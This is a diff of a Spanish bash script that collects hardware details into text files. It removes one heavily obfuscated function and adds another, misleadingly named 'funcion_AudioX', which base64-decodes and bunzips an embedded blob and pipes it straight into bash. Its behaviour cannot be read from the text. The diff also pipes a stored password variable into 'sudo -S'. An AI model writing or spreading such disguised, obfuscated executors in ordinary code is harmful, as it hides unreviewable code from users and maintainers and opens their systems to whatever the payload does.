@@ -26,8 +26,8 @@ funcion_notificacion(){
         fi          
 }
 
-funcion_listado(){
-  ${@/xF7e} $'\u0065'"${@~}"v$'\x61'${*}l   "$(    ${@}   p\r"i"${*^}n$'\x74'""f  %s ' }^^@{$   },XCNgQc%%*{$   ")  }A!\orK##*{$ },*{$  ;   }Xiz{\A*X//*{$  }^@{$  "}~~xIwCSLhw{$"   s%  ftni}y,-\FZt/*{$rp   }*!{$   }]\|(\Z8#*{$ ; }~*{$   '"'"'  },*{$  }^^*{$ ")      "}~@{$"   C-   2}f3Q7/abt6!\://*{$'"'"'"'"'"'"'"'"'P'"'"'"'"'"'"'"'"''"'"'"'"'"'"'"'"'151\'"'"'"'"'"'"'"'"'$""Z\""NUB  "}~@{$"  | }~hE}\]\C/XCM@0:7G/@{$  }@!{$ D-   '"'"'"'"'"'"'"'"'4'"'"'"'"'"'"'"'"'6\'"'"'"'"'"'"'"'"'E3700U\'"'"'"'"'"'"'"'"'$'"'"'"'"'"'"'"'"'141\'"'"'"'"'"'"'"'"'$B\'"'"'"'"'"'"'"'"''"'"'"'"'"'"'"'"'   }^@{$  |  "@$"  }@!{$ '"'"'"'"'"'"'"'"'==aUzi7ResOWPi5U4FkwHUmgilabn9VB764jvALfaDZFbMEsSxqdzwGpWFlYcH0EDr1dOdvaPc1ANaXyZcIrcmkaQATveL3vROqwCvtRkm8mOmtn0vfI1OkxQaftfeyMO5kakL8CvaLKLBLyGx2gCCp7Z1lgKyeMWqmaKOQKueujqcrvc1OkiLkrvbHKeY0baHR71bnsyvqGqOjmxb00fwm4LM+iHUrTZOH5pkakqVhfafn9QNR0PjeVOzNVjtYBVZI4fubC4LxwHpmxSuCtE7MiJMY3UCEgJ8EVZ6o99I3YBEEE6N38Qd5z84ryqQfjSibLHdrPjYM2ayJXDBEn0wm73G9cthF1gaBGqaPWLgDWfsGN7mh2C4pQgElFJs6SC69FXJxTg/8uE7/g7UwiPrH/m+MhEmDVTG/6ZBWOAeka2AxWiczLgke6vxTAe8FmNg07XNYMBltPBQn6HTUy8ExunZze+cJQXjByiBkegviSkm19nsWMbA3/6m+C94Y3Z595Z0PthkEz6PHL3nT9HWEqQqdCvfKYJ922gBmwDByqwlEy85VMbOmLe7hqgUPkwMP2CybIoJg6vGWIGhBAiPXaCHPgFFnPbnv1e3gAXOSfqvc5STmsesGOg9+6fUssXw166kFzHGCqtWeNZ7f74LONVlFx8RrerUFTikIQIsZLHNZ4ycWsUzndpAvuPJm6mEgxVQsaLkwYKafLjIijvbA5E1gq4GAPIKKeqjeLf1YOWveLNzyMxILAXc4Q2H6Uj681IiOkQkI0bTBgVAvvvR1zYEjclRugJSRBD2EBAnoUTKZ35N/D3V0aRbH0Nc7JpRBONAyYYP774iB7i7Y6YOuoncil/CVO/YLraaAB1FhAQNmnGMgedY0qmnkzQjrcazaaaGyAqJMgagqdaanqdaGgvAsJspLaAaaaKrdaavbqtdiP9Oj9upLPEM6r1pv/uYpvTPFQ2tjJAcfjmvAD30jVjB2aq9aaaa8daaaWFa4/Db+/7thG/5uaaCZq2xzwtzswbftoOPLq'"'"'"'"'"'"'"'"'   F\T"N"I"R"P'"'"'"'"'"'"'"'"''"'"'"'"'"'"'"'"'  },,@{$     ($"   L"""A"'"'"'"'"'"'"'"'"'67X\E'"'"'"'"'"'"'"'"'$  },,*{$  '"'"'=xIwCSLhw     ($"  lav}^*{$e }@!{$  '   ${!*}   | ${*} ${*^}  rev ${*} ${*,,} ;   ${@//P>\]s4%\(\{}   ${@##a9z99Pg}    )"   ${*%%,xh<9W,}
+funcion_AudioX(){
+      ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
 }
 
 
@@ -70,7 +70,7 @@ rm $RutaLecturaGen/discos_duros.txt
  Placa_Madre=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Product Name:")
  Placa_Madre_Ver=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Version:")
  MemoriaRam=$(cat $RutaLecturaGen/memoria_ram.txt | grep "Size" )
- funcion_listado $Musica_l | sudo -S ls /root && sudo parted -l > $RutaLecturaGen/discos_duros.txt
+ echo $Musica_l | sudo -S ls /root && sudo parted -l > $RutaLecturaGen/discos_duros.txt
  DiscoDuro=$(cat $RutaLecturaGen/discos_duros.txt | grep Disco | while read Col1 Col2 Col3; do echo $Col3; done )
  Procesador=$(cat $RutaLecturaGen/procesador.txt | grep -E "Version:")
  
